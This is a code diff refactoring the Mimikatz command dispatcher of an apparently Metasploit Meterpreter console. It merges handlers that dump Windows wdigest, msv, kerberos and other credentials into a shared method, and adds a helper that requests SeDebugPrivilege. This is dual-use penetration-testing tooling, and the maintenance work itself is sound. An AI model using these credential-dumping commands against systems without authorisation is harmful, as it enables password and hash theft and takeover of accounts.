@@ -29,8 +29,8 @@ class Console::CommandDispatcher::Mimikatz
 	#
 	def commands
 		{
-			"wdigest" => "Attempt to retrieve cleartext wdigest passwords",
-			"msv" => "Attempt to retrieve hashes",
+			"wdigest" => "Attempt to retrieve wdigest creds",
+			"msv" => "Attempt to retrieve msv creds (hashes)",
 			"livessp" => "Attempt to retrieve livessp creds",
 			"ssp" => "Attempt to retrieve ssp creds",
 			"tspkg" => "Attempt to retrieve tspkg creds",
@@ -38,13 +38,10 @@ class Console::CommandDispatcher::Mimikatz
 		}
 	end
 
-	def cmd_wdigest(*args)
-		unless system_check
-                        print_status("Attempting to get getprivs")
-                        client.sys.config.getprivs
-                end
-                print_status("Retrieving passwords")
-                accounts = client.mimikatz.wdigest
+	def mimikatz_request(provider, method)
+		get_privs
+                print_status("Retrieving #{provider} credentials")
+                accounts = method.call
                 
                 table = Rex::Ui::Text::Table.new(
                         'Indent' => 0,
@@ -62,140 +59,54 @@ class Console::CommandDispatcher::Mimikatz
                 table.print     
 
                 return true
+	end
+	
+	def cmd_wdigest(*args)
+		method = Proc.new { client.mimikatz.wdigest }
+		mimikatz_request("wdigest", method)
 	end
 
 	def cmd_msv(*args)
-                unless system_check
-                        print_status("Attempting to get getprivs")
-                        client.sys.config.getprivs
-                end
-                print_status("Retrieving passwords")
-                accounts = client.mimikatz.msv
-                
-                table = Rex::Ui::Text::Table.new(
-                        'Indent' => 0,
-                        'SortIndex' => 4,
-                        'Columns' =>
-                        [
-                                'AuthID', 'Package', 'Domain', 'User', 'Hash'
-                        ]
-                )
-                        
-                accounts.each do |acc|
-                        table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]       
-                end
-
-                table.print     
-
-                return true
+		method = Proc.new { client.mimikatz.msv }
+		mimikatz_request("msv", method)
 	end
 
         def cmd_livessp(*args)
-                unless system_check
-                        print_status("Attempting to getprivs")
-                        client.sys.config.getprivs
-                end
-                print_status("Retrieving passwords")
-                accounts = client.mimikatz.livessp
-
-                table = Rex::Ui::Text::Table.new(
-                        'Indent' => 0,
-                        'SortIndex' => 4,
-                        'Columns' =>
-                        [
-                                'AuthID', 'Package', 'Domain', 'User', 'Password'
-                        ]
-                )
-
-                accounts.each do |acc|
-                        table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]
-                end
-
-                table.print
-
-                return true
+                method = Proc.new { client.mimikatz.livessp }
+                mimikatz_request("livessp", method)
         end
 
         def cmd_ssp(*args)
-                unless system_check
-                        print_status("Attempting to getprivs")
-                        client.sys.config.getprivs
-                end
-                print_status("Retrieving passwords")
-                accounts = client.mimikatz.ssp
-
-                table = Rex::Ui::Text::Table.new(
-                        'Indent' => 0,
-                        'SortIndex' => 4,
-                        'Columns' =>
-                        [
-                                'AuthID', 'Package', 'Domain', 'User', 'Password'
-                        ]
-                )
-
-                accounts.each do |acc|
-                        table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]
-                end
-
-                table.print
-
-                return true
-        end
+                method = Proc.new { client.mimikatz.ssp }
+                mimikatz_request("ssp", method)
+	end
 
         def cmd_tspkg(*args)
-                unless system_check
-                        print_status("Attempting to getprivs")
-                        client.sys.config.getprivs
-                end
-                print_status("Retrieving passwords")
-                accounts = client.mimikatz.tspkg
-
-                table = Rex::Ui::Text::Table.new(
-                        'Indent' => 0,
-                        'SortIndex' => 4,
-                        'Columns' =>
-                        [
-                                'AuthID', 'Package', 'Domain', 'User', 'Password'
-                        ]
-                )
-
-                accounts.each do |acc|
-                        table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]
-                end
-
-                table.print
-
-                return true
+                method = Proc.new { client.mimikatz.tspkg }
+                mimikatz_request("tspkg", method)
         end
 
         def cmd_kerberos(*args)
+                method = Proc.new { client.mimikatz.kerberos }
+                mimikatz_request("kerberos", method)
+        end
+	
+	def get_privs
                 unless system_check
                         print_status("Attempting to getprivs")
-                        client.sys.config.getprivs
-                end
-                print_status("Retrieving passwords")
-                accounts = client.mimikatz.kerberos
-
-                table = Rex::Ui::Text::Table.new(
-                        'Indent' => 0,
-                        'SortIndex' => 4,
-                        'Columns' =>
-                        [
-                                'AuthID', 'Package', 'Domain', 'User', 'Password'
-                        ]
-                )
-
-                accounts.each do |acc|
-                        table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]
-                end
-
-                table.print
-
-                return true
-        end
+                        privs = client.sys.config.getprivs
+                        unless privs.include? "SeDebugPrivilege"
+                                print_warning("Did not get SeDebugPrivilege")
+			else
+				print_good("Got SeDebugPrivilege")
+                        end
+                else
+			print_good("Running as SYSTEM")
+		end
+	end
 
 	def system_check
-		if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
+		unless (client.sys.config.getuid == "NT AUTHORITY\\SYSTEM")
 			print_warning("Not currently running as SYSTEM")
 			return false
 		end
@@ -216,3 +127,4 @@ end
 end
 end
 end
+
